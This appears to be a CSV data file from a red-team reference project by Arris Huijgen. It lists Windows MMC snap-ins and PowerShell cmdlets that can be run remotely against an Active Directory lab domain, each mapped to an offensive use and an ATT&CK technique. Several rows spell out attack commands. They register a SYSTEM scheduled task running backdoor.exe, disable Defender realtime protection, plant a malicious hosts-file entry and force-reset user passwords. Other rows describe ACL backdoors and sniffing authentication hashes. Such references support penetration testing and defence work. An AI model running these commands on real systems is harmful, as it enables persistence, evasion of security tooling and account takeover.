"domain.msc","Active Directory Domains and Trusts","2023-07-01","[''GUI''-|-''RSAT'']","","domain.msc /server=DC1.ad.bitsadmin.com","Active Directory Domains and Trusts","Perform reconnaissance on domain trusts","Domain","[''Will initially show some errors because the offensive Windows host is not part of a domain''-|-''Right click the Active Directory Domains and Trusts node in the list of snap-ins and choose Change Forest or Change Domain. Now enter the FQDN of the root domain and click OK'']","T1484.002","None","","","Arris Huijgen","bitsadmin","[''389/TCP''-|-''445/TCP'']","false"
"dnsmgmt.msc","DNS Manager","2023-07-01","[''GUI''-|-''RSAT'']","","dnsmgmt.msc /ComputerName DC1.ad.bitsadmin.com","DNS Manager","Modify/create DNS record for internal phishing website","Manage","Alternatively, in GUI right click root node -> Connect to DNS Server","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"diskmgmt.msc","Disk Management","2023-07-01","[''Builtin''-|-''GUI'']","","compmgmt.msc","Disk Management","None","Manage","See [compmgmt.msc](../compmgmt) how to use it against a remote host. Returns errors though when connecting, so does not seem to work.","None","None","","","Arris Huijgen","bitsadmin","[''445/TCP''-|-''135/TCP'']","false"
"dhcpmgmt.msc","DHCP","2023-07-01","[''GUI''-|-''RSAT'']","","dhcpmgmt.msc /ComputerName DC1.ad.bitsadmin.com","DHCP","None","Manage","Alternatively, in GUI right click root node -> Add server","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"dfsmgmt.msc","DFS Management","2023-07-01","[''GUI''-|-''RSAT'']","","dfsmgmt.msc","DFS Management","None","Data","Right click root node -> Add Namespaces to Display or Add Replication Groups to Display","None","None","","","Arris Huijgen","bitsadmin","[''389/UDP''-|-''445/TCP'']","false"
"devmgmt.msc","Device Manager","2023-07-01","[''Builtin''-|-''GUI'']","","compmgmt.msc","Device Manager","None","Manage","See [compmgmt.msc](../compmgmt) how to use it against a remote host. Returns errors though when connecting, so does not seem to work","None","None","None","","Arris Huijgen","bitsadmin","","false"
"compmgmt.msc","Computer Management","2023-07-01","[''Builtin''-|-''GUI'']","","compmgmt.msc /computer:DC1.ad.bitsadmin.com","Computer Management","None","Manage","[''Includes: [taskschd.msc](../taskschd), [eventvwr.msc](../eventvwr), [fsmgmt.msc](../fsmgmt), [lusrmgr.msc](../lusrmgr), [perfmon.msc](../perfmon), [devmgmt.msc](../devmgmt), [diskmgmt.msc](../diskmgmt), [services.msc](../services) and [WmiMgmt.msc](../WmiMgmt)''-|-''Alternatively in the GUI, right click root node -> Connect to another computer -> `DC1.ad.bitsadmin.com`''-|-''Alternative way to launch: `CompMgmtLauncher.exe`'']","None","None","","","Arris Huijgen","bitsadmin","[''445/TCP''-|-''135/TCP'']","false"
"comexp.msc","Component Services","2024-04-19","[''Builtin''-|-''GUI'']","","comexp.msc","Component Services","[''Privesc: manipulate settings of COM objects so it runs with higher privileges''-|-''Modify ACLs to create a backdoor on the system'']","Manage","[''Component Services -> Computers -> Right click -> New -> Computer -> Browse -> `DC1.ad.bitsadmin.com`''-|-''Does not work from OffensiveDC''-|-''Alternative way to launch: `dcomcnfg.exe`'']","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"certtmpl.msc","Certificate Templates","2023-07-01","[''GUI''-|-''RSAT'']","","certtmpl.msc","Certificate Templates","Create new vulnerable templates and enroll for those as authentication backdoor","Manage","[''Right click root node -> Connect to another writable domain controller -> Change -> `ad.bitsadmin.com` -> OK''-|-''Requires OffensiveDC'']","None","None","","","Arris Huijgen","bitsadmin","389/UDP","false"
"certsrv.msc","Certificate Authority","2023-07-01","[''GUI''-|-''RSAT'']","","certsrv.msc /COMPUTER:CASUB1.AD.BITSADMIN.COM","Certificate Authority","Approve certificate requests","Manage","[''Alternatively in the GUI, right click root node -> Retarget Certification Authority -> Another Computer: `CASUB1.ad.bitsadmin.com`''-|-''Note that the Certificate Templates section returns error `Template information could not be loaded: The specified domain either does not exist or could not be contacted`'']","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"certmgr.msc","Certificates - Current User","2023-07-01","[''Builtin''-|-''GUI'']","","certmgr.msc","Certificates - Current User","None","Manage","Does not seem possible to use this snap-in remotely","None","None","None","","Arris Huijgen","bitsadmin","","false"
"certlm.msc","Certificates - Local Computer","2023-07-01","[''Builtin''-|-''GUI'']","","certlm.msc","Certificates - Local Computer","[''Export private keys (if marked as exportable)''-|-''Install malicious trusted root certificates'']","Manage","[''Right click -> Connect to another computer -> Enter the object name to select -> `DC1.ad.bitsadmin.com`''-|-''Quite slow when used over SOCKS'']","T1553.004","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"azman.msc","Authorization Manager","2023-07-01","[''GUI''-|-''RSAT'']","","azman.msc","Authorization Manager","None","Manage","Right click root node -> Open Authorization Store -> Active Directory or Active Directory Application Mode (ADAM) -> Browse","None","None","","","Arris Huijgen","bitsadmin","389/UDP","false"
"adsiedit.msc","ADSI Edit","2023-07-01","[''GUI''-|-''RSAT'']","","adsiedit.msc","ADSI Edit","[''Backdoor ACLs of AdminSDHolder container''-|-''Weaken security ACLs of OUs''-|-''Reset passwords''-|-''View sensitive information like LAPS passwords in the attribute editor'']","Manage","[''When it is launched from a `runas /netonly` prompt, it automatically connects to the right instance. Alternatively, right click the root node -> Connect to -> select Default (Domain or server that you logged in to)''-|-''Port 636/TCP is used in case SSL-based Encryption is selected'']","None","None","","","Arris Huijgen","bitsadmin","[''389/UDP''-|-''389/TCP''-|-''636/TCP'']","false"
"WmiMgmt.msc","WMI Control","2023-07-01","[''Builtin''-|-''GUI'']","","WmiMgmt.msc","WMI Control","Add WMI backdoor by weakening the security of the root namespace","Manage","Right click WMI Control -> Connect to another computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK","T1047","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"WdsMgmt.msc","Windows Deployment Services","2023-07-01","[''GUI''-|-''RSAT'']","","WdsMgmt.msc","Windows Deployment Services","None","Manage","Right click on Servers -> Add Server -> Another computer: `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"WF.msc","Windows Defender Firewall with Advanced Security","2023-07-01","[''Builtin''-|-''GUI'']","","mmc.exe","Windows Defender Firewall with Advanced Security","[''Add an exception to the filewall for a backdoor executable/port''-|-''Disable the Windows Defender Firewall'']","Manage","mmc.exe -> File -> Add/Remove Snap-In -> Windows Defender Firewall with Advanced Security -> Add -> Another computer: `W10.ad.bitsadmin.com` -> Finish -> OK","T1562.004","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"SQLServerManager16.msc","SQL Server 2022 Configuration Manager","2023-07-01","[''Extra''-|-''GUI'']","","SQLServerManager16.msc /computer:SQL1.ad.bitsadmin.com","SQL Server 2022 Configuration Manager","None","Manage","Install ""Integration Services"" in the SQL Server Express or Developer installation wizard","None","https://www.microsoft.com/en-us/evalcenter/download-sql-server-2022","","","Arris Huijgen","bitsadmin","135/TCP","false"
"SQLServerManager15.msc","SQL Server 2019 Configuration Manager","2023-07-01","[''Extra''-|-''GUI'']","","SQLServerManager15.msc /computer:SQL1.ad.bitsadmin.com","SQL Server 2019 Configuration Manager","None","Manage","Install ""Client Tools Connectivity"" in the SQL Server Express or Developer installation wizard","None","https://www.microsoft.com/en-us/evalcenter/download-sql-server-2019","","","Arris Huijgen","bitsadmin","135/TCP","false"
"RAMgmtUI.exe","Remote Access Management","2023-07-01","[''GUI''-|-''RSAT'']","","RAMgmtUI.exe -computerName DC1.ad.bitsadmin.com","Remote Access Management","None","Manage","Manage DirectAccess and VPN","None","None","","","Arris Huijgen","bitsadmin","[''445/TCP''-|-''135/TCP''-|-''5985/TCP''-|-''389/UDP'']","false"
"Microsoft.IdentityServer.msc","AD FS Management","2024-12-13","[''GUI''-|-''Server'']","","%SystemRoot%\ADFS\Microsoft.IdentityServer.msc","AD FS Management","None","Manage","Seems not possible to use this MMC remotely. Use the ADFS PowerShell module instead","None","None","None","","Arris Huijgen","bitsadmin","","false"
"DevModeRunAsUserConfig.msc","Group policy settings: Start Menu and Taskbar","2023-07-01","[''Builtin''-|-''GUI'']","","gpedit.msc","Group policy settings: Start Menu and Taskbar","None","Domain","[''For remote use, see [gpedit.msc](../gpedit)''-|-''Equivalent to gpedit.msc -> User Configuration -> Administrative Templates -> Start Menu and Taskbar'']","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"CluAdmin.msc","Failover Cluster Manager","2023-07-01","[''GUI''-|-''RSAT'']","","CluAdmin.msc","Failover Cluster Manager","None","Manage","Right click Failover Cluster Manager -> Connect to Cluster -> Browse","None","None","","","Arris Huijgen","bitsadmin","389/UDP","false"
"AdRmsAdmin.msc","Active Directory Rights Management Services","2023-07-01","[''GUI''-|-''RSAT'']","","AdRmsAdmin.msc","Active Directory Rights Management Services","None","Domain","Right click -> Add Cluster -> Connect to: Remote computer","None","None","","","Arris Huijgen","bitsadmin","[''80/TCP''-|-''443/TCP'']","false"
"Write-EventLog","Writes an event to an event log.","2023-07-01","[''Builtin''-|-''TODO'']","","Write-EventLog","TODO","None","Logs","PowerShell Module: `Microsoft.PowerShell.Management`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Unregister-ScheduledTask","Unregisters a scheduled task","2023-07-01","[''Builtin''-|-''CIMSession'']","","Unregister-ScheduledTask -CimSession $s Backdoor -Confirm:$false","Remove scheduled task","Remove persistence","Execute","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `ScheduledTasks`'']","[''T1053.005''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Unlock-ADAccount","Unlocks an Active Directory account","2023-07-01","[''RSAT''-|-''TODO'']","","Unlock-ADAccount","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Uninstall-WindowsFeature","Uninstalls specified Windows Server roles, role services, and features from a computer that is running Windows Server 2012 R2","2023-07-01","[''RSAT''-|-''TODO'']","","Uninstall-WindowsFeature","TODO","None","Manage","PowerShell Module: `ServerManager`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Test-NetConnection","Displays diagnostic information for a connection","2023-07-01","[''Builtin''-|-''TODO'']","","Test-NetConnection","TODO","None","Network","PowerShell Module: `NetTCPIP`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Test-Connection","Sends ICMP echo request packets, or pings, to one or more computers.","2023-07-01","[''Builtin''-|-''TODO'']","","Test-Connection DC1.ad.bitsadmin.com","None","None","Network","By default uses ICMP, however provides a number of parameters related to authentication","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Stop-NetEventSession","Stops event and packet capture for a network event session","2023-07-01","[''Builtin''-|-''CIMSession'']","","Stop-NetEventSession -Name sess -CimSession $s","Stop packet capture","Sniff authentication traffic on a domain controller and locally crack the hashes","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See all details in [New-NetEventSession](../New-NetEventSession)''-|-''PowerShell Module: `NetEventPacketCapture`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Stop-EtwTraceSession","Stops the specified ETW session","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Stop-EtwTraceSession -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `EventTracingManagement`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Stop-Computer","Stops (shuts down) local and remote computers","2023-07-01","Builtin","","Stop-Computer -ComputerName W10.ad.bitsadmin.com,w11.ad.bitsadmin.com -Force","Shutdown machines","Make machine unavailable","Sessions","PowerShell Module: `Microsoft.PowerShell.Management`","T1529","None","None","","Arris Huijgen","bitsadmin","","false"
"Start-VM","Starts a virtual machine","2023-07-01","[''Builtin''-|-''CIMSession'']","","Start-VM -Name 'Windows 10 22H2' -CimSession $s","Start VM","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Hyper-V`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Start-ScheduledTask","Starts one or more instances of a scheduled task","2023-07-01","[''Builtin''-|-''CIMSession'']","","Start-ScheduledTask -CimSession $s -TaskName Backdoor","Launch scheduled task","Launch implant","Execute","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `ScheduledTasks`'']","[''T1053.005''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Start-NetEventSession","Starts event and packet capture for a network event session","2023-07-01","[''Builtin''-|-''CIMSession'']","","Start-NetEventSession -Name sess -CimSession $s","TODO","Sniff authentication traffic on a domain controller and locally crack the hashes","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See all details in [New-NetEventSession](../New-NetEventSession)''-|-''PowerShell Module: `NetEventPacketCapture`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Start-DscConfiguration","Applies configuration to nodes","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Start-DscConfiguration -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `PSDesiredStateConfiguration`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Show-NetFirewallRule","Displays all of the existing IPsec rules and associated objects in a fully expanded view","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Show-NetFirewallRule -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Show-EventLog","Displays the event logs of the local or a remote computer in Event Viewer","2023-07-01","[''Builtin''-|-''GUI'']","","Show-EventLog -ComputerName W10.ad.bitsadmin.com","Show Windows event log","[''Disable certain logs (Right click -> Disable Log)''-|-''Identify source IPs from which certain users have logged in to chase after their workstations'']","Logs","[''Simply launches `mmc.exe eventvwr.msc /COMPUTER:W10.ad.bitsadmin.com`''-|-''Equivalent to [eventvwr.msc](../../MMC/eventvwr)'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Show-DnsServerCache","Shows the records in a DNS Server Cache","2023-07-01","[''CIMSession''-|-''RSAT'']","","Show-DnsServerCache -CimSession $s","Show DNS server cached DNS entries","Reconnaissance on the network/Internet activities on the domain","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-WSManInstance","Modifies the management information that is related to a resource","2023-07-01","[''Builtin''-|-''TODO'']","","Set-WSManInstance","TODO","None","Manage","PowerShell Module: `Microsoft.WSMan.Management`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ScheduledTask","Modifies a scheduled task","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Set-ScheduledTask -CimSession $s","Update schedule task","None","Processes","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `ScheduledTasks`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-NetRoute","Modifies an entry or entries in the IP routing table","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Set-NetRoute -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-NetNatGlobal","Modifies global settings for NAT instances on a computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Set-NetNatGlobal -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-NetNat","Modifies settings for NAT objects","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Set-NetNat -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-NetFirewallSetting","Modifies the global firewall settings of the target computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Set-NetFirewallSetting -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-NetFirewallRule","Modifies existing firewall rules","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Set-NetFirewallRule -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-NetFirewallProfile","Configures settings that apply to the per-profile configurations of the Windows Firewall with Advanced Security","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Set-NetFirewallProfile -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-NetConnectionProfile","Changes the network category of a connection profile","2023-07-01","[''Builtin''-|-''CIMSession'']","","Set-NetConnectionProfile -CimSession $s -InterfaceAlias 'Ethernet0' -NetworkCategory Private","Update connection profile for network adapter","Update connection profile to have a different firewall policy applied","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetConnection`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-MpPreference","Configures preferences for Windows Defender scans and updates","2023-07-01","[''Builtin''-|-''CIMSession'']","","Set-MpPreference -CimSession $s -DisableRealtimeMonitoring $true","Disable realtime monitoring","Disable the realtime protection of Windows Defender to be able to drop malicious binaries","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Note this will shown an alert to the user, alternative is to add an excluded folder using [Add-MpPreference](../Add-MpPreference)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-DhcpServerAuditLog","Sets the Dynamic Host Configuration Protocol (DHCP) server service audit log configuration on the DHCP server service running on the computer","2023-07-01","[''CIMSession''-|-''TODO'']","","Set-DhcpServerAuditLog -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-CimInstance","Modifies a CIM instance on a CIM server by calling the ModifyInstance method of the CIM class","2023-07-01","[''Builtin''-|-''CIMSession'']","","Set-CimInstance -Query 'Select * from Win32_Environment where name LIKE ""testvar%""' -Property @{VariableValue=""abcd""}","Update attribute of CIM instance","Update path variable","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ADUser","Modifies an Active Directory user","2023-07-01","[''RSAT''-|-''TODO'']","","Set-ADUser","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ADServiceAccount","Modifies an Active Directory managed service account or group managed service account object","2023-07-01","[''RSAT''-|-''TODO'']","","Set-ADServiceAccount","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ADObject","Modifies an Active Directory object","2023-07-01","[''RSAT''-|-''TODO'']","","Set-ADObject","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ADGroup","Modifies an Active Directory group","2023-07-01","[''RSAT''-|-''TODO'']","","Set-ADGroup","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ADAccountPassword","Modifies the password of an Active Directory account","2023-07-01","RSAT","","[''$new = ConvertTo-SecureString 'NewPassword1!' -A -F Set-ADAccountPassword -Identity MyAccount -Reset -NewPassword $new ''-|-''$old = ConvertTo-SecureString 'OldPassword1!' -A -F $new = ConvertTo-SecureString 'NewPassword1!' -A -F Set-ADAccountPassword -Identity MyAccount -OldPassword $old -NewPassword $new '']","[''Reset password''-|-''Update password'']","[''Force reset a user's password to obtain access to the account''-|-''Update a user's password'']","[''Domain''-|-''Domain'']","[''PowerShell Module: `ActiveDirectory`''-|-''PowerShell Module: `ActiveDirectory`'']","[''T1531''-|-''T1531'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ADAccountExpiration","Sets the expiration date for an Active Directory account","2023-07-01","[''RSAT''-|-''TODO'']","","Set-ADAccountExpiration","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ADAccountControl","Modifies user account control (UAC) values for an Active Directory account","2023-07-01","[''RSAT''-|-''TODO'']","","Set-ADAccountControl","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Search-ADAccount","Gets Active Directory user, computer, or service accounts","2023-07-01","RSAT","","Search-ADAccount -AccountInactive -TimeSpan 30","Search for accounts","Accounts that are inactive for at least 30 days","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Restart-Computer","Restarts the operating system on local and remote computers","2023-07-01","Builtin","","Restart-Computer -ComputerName W10.ad.bitsadmin.com,W11.ad.bitsadmin.com","Restart machines","When persistence has been accomplished, a restart will trigger execution of the payload","Sessions","PowerShell Module: `Microsoft.PowerShell.Management`","T1529","None","None","","Arris Huijgen","bitsadmin","","false"
"Resolve-DnsName","Performs a DNS name query resolution for the specified name","2023-07-01","Builtin","","Resolve-DnsName -Type SRV _kerberos._tcp.ad.bitsadmin.com","Identify servers in the domain","Identify Kerberos Key Distribution Center service","Network","[''Various other queries available to identify servers at the resources link''-|-''PowerShell Module: `DnsClient`'']","T1590.002","https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7fcdce70-5205-44d6-9c3a-260e616a2f04","None","","Arris Huijgen","bitsadmin","","false"
"Rename-ADObject","Changes the name of an Active Directory object","2023-07-01","[''RSAT''-|-''TODO'']","","Rename-ADObject","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-VirtualDisk","Deletes an existing virtual disk and reclaims the used space for use by other virtual disks in the same storage pool","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-VirtualDisk -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-SmbShare","Deletes the specified SMB shares","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-SmbShare -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-NetNatStaticMapping","Removes static mappings from a NAT instance","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-NetNatStaticMapping -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-NetNatExternalAddress","Removes an external address from a NAT instance","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-NetNatExternalAddress -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-NetNat","Removes NAT objects","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-NetNat -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-NetEventSession","Removes a network event session","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-NetEventSession -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetEventPacketCapture`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-MpThreat","Removes active threats from a computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-MpThreat -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-MpPreference","Removes exclusions or default actions","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-MpPreference -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-FileShare","Removes a file share","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-FileShare -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-DhcpServerv4Lease","Deletes the specified IPv4 address lease record from the Dynamic Host Configuration Protocol (DHCP) server service","2023-07-01","[''CIMSession''-|-''TODO'']","","Remove-DhcpServerv4Lease -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-ADUser","Removes an Active Directory user","2023-07-01","[''RSAT''-|-''TODO'']","","Remove-ADUser","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Register-ScheduledTask","Registers a scheduled task definition on a local computer","2023-07-01","[''Builtin''-|-''CIMSession'']","","$a = New-ScheduledTaskAction -Execute ""C:\Tmp\backdoor.exe"" -Argument '-background' $p = New-ScheduledTaskPrincipal -UserId ""NT Authority\SYSTEM"" $ss = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -AllowStartIfOnBatteries -Compatibility Win8 New-ScheduledTask -CimSession $s -Action $a -Principal $p -Settings $ss $t = Register-ScheduledTask -CimSession $s Backdoor -InputObject $d","Create new scheduled task","Persistence","Execute","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `ScheduledTasks`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Register-CimIndicationEvent","Subscribes to indications using a filter expression or a query expression","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Register-CimIndicationEvent -CimSession $s","TODO","None","Execute","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Publish-DscConfiguration","Publishes a DSC configuration to a set of computers","2023-07-01","[''Builtin''-|-''TODO'']","","Publish-DscConfiguration","TODO","None","Manage","PowerShell Module: `PSDesiredStateConfiguration`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Out-File","Sends output to a file","2023-07-01","Builtin","","""10.0.10.123 legit.com"" | Out-File -Append \\W10.ad.bitsadmin.com\C$\Windows\System32\Drivers\etc\hosts -Encoding ascii","Append line to file","Add name to target host file to point to a malicious IP","Data","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"New-WSManInstance","Creates a new instance of a management resource","2023-07-01","[''Builtin''-|-''TODO'']","","New-WSManInstance","TODO","None","Manage","PowerShell Module: `Microsoft.WSMan.Management`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"New-VirtualDiskSnapshot","Creates a new snapshot of the specified virtual disk","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","New-VirtualDiskSnapshot -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-VirtualDisk","Creates a new virtual disk in the specified storage pool","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","New-VirtualDisk -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-SmbShare","Creates an SMB share","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","New-SmbShare -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
